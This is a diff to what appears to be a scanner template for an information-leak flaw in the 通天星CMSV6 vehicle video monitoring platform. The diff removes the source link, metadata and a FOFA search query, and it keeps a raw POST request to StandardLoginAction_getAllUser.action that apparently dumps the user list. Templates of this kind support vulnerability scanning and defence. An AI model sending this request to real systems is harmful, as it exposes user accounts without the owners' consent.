@@ -3,12 +3,8 @@ info:
   name: 通天星CMSV6 车载视频监控平台 信息泄露漏
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hoid0kh5u0s4234e'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hoid0kh5u0s4234e
-    fofa: body="/808gps/"
 http:
 - raw:
   - 'POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Accept-Encoding: gzip, deflate
-
-
 
 
     json=null
